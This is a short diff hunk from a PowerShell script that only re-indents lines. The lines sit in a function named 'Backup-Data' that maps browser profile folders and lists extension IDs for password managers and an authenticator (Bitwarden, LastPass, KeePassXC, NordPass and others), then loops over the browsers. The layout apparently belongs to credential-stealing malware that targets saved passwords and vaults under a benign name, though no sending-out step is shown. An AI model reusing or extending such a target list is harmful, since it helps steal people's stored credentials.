@@ -786,15 +786,15 @@ function Backup-Data {
         "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
     }
     $password_mgr_dirs = @{
-        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"                    
-		"eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass"
-		"fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane"
-		"nngceckbapebfimnlniiiahkandclblb" = "Bitwarden"
-		"pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm"
-		"bfogiafebfohielmmehodmfbbebbbpei" = "Keeper"
-		"cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword"
-		"oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC"
-		"hdokiejnpimakedhajhdlcegeplioahd" = "LastPass"
+        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"                 
+	    "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass"
+	    "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane"
+	    "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden"
+	    "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm"
+	    "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper"
+	    "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword"
+	    "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC"
+	    "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass"
     }
     foreach ($browser in $browserPaths.GetEnumerator()) {
         $browserName = $browser.Key
